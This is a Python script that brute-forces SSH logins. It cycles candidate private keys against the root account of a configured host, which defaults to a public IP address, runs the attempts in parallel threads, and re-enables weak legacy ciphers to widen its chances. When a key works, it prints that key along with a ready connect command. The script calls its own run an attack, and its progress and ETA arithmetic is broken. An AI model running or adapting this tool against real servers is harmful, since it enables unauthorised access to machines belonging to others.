import subprocess
import time
import os
import threading
import sys
import signal

# Enhanced Configuration
config = {
    "host": "8.8.8.8",  # IP address or FQDN
    "port": "22",  # SSH port
    "users": ["root"],  # Usernames to attempt
    "dirs": ["./"],  # Directories of keys to attempt
    "success_code": 0,  # Process exit code for a successful attempt
    "reject_str": "Connection closed by remote host",  # Connection rejection indicator
    "period": 6,  # Reporting period in seconds
    "threads": 9,  # Number of threads
    "debug": False,  # Debug mode
    "log_file": "ssh_attempts.log"  # Log file
}

# Global variables
pool = 0
die = False

# Colours for console output
class Colours:
    red = "\033[31m"
    green = "\033[32m"
    bold = "\033[1m"
    clear = "\033[0m"

# Function to write to log file
def log_to_file(message):
    with open(config["log_file"], "a") as log_file:
        log_file.write(f"{message}\n")

# Function for SSH attempt
def attempt(config, user, key):
    global pool, die
    cmd = ("ssh -oKexAlgorithms=+diffie-hellman-group1-sha1"
           + " -oHostKeyAlgorithms=+ssh-dss,ssh-rsa"
           + " -oPubkeyAcceptedKeyTypes=+ssh-dss,ssh-rsa"
           + " -oPreferredAuthentications=publickey"
           + f" -T -p {config['port']} -i {key} {user}@{config['host']}")
    try:
        p = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        while config["reject_str"] in p.stdout.decode("utf-8"):
            log_to_file(f"Connection rejected - Retrying {key}")
            p = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        if config["debug"]:
            log_to_file(f"{user}@{config['host']}:{config['port']} with {key} -> code={p.returncode}\t{p.stdout.decode('utf-8')}")
        if p.returncode == config["success_code"] and not die:
            success_message = f"\a\a\a\a[SUCCESS] valid key found: {key}\nConnect with: {cmd.replace('-T ', '')}"
            print(success_message)
            log_to_file(success_message)
            die = True
        else:
            pool += 1
    except Exception as e:
        log_to_file(f"Error in attempt: {e}")

# Function to enumerate keys
def enum_dir(dirs):
    keys = []
    for dir in dirs:
        try:
            files = os.listdir(dir)
            keys += [os.path.join(dir, file) for file in files if "." not in file]
        except OSError as e:
            log_to_file(f"Error accessing directory {dir}: {e}")
    keys.sort()
    return keys

# Signal handler for graceful exit
def suicide(signum, frame):
    global die
    die = True

# Function for cleanup
def cleanup():
    print("Waiting for threads to finish... ", end="")
    while len(threading.enumerate()) > 1:
        time.sleep(1)
    print("DONE")
    sys.exit(0)

# Main function
def main(config):
    print("Starting SSH connection test script...")
    keys = enum_dir(config["dirs"])
    if not keys:
        print("No valid keys found. Exiting.")
        sys.exit(1)
    n = len(keys) * len(config["users"])
    print(f"Found {len(keys)} key(s) and {len(config['users'])} username(s) -> {n} candidates")
    global die, pool
    pool = config["threads"]
    start_time = time.time()
    cur_time = time.time()
    print("Starting attack...\n")
    for key in keys:
        for user in config["users"]:
            if die:
                cleanup()
            while pool == 0:
                time.sleep(1)
            threading.Thread(target=attempt, args=(config, user, key), daemon=True).start()
            pool -= 1
            if time.time() > cur_time + config["period"]:
                elapsed = time.time() - start_time
                speed = (elapsed / n) * 60
                eta = (n - n / elapsed) / speed
                print(f"Tested: {n}\tRemaining: {n-n}\tElapsed: {elapsed/60:.1f}m\tSpeed: {speed:.1f}/s\tETA: {eta:.1f}m")
                cur_time = time.time()
    cleanup()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, suicide)
    main(config)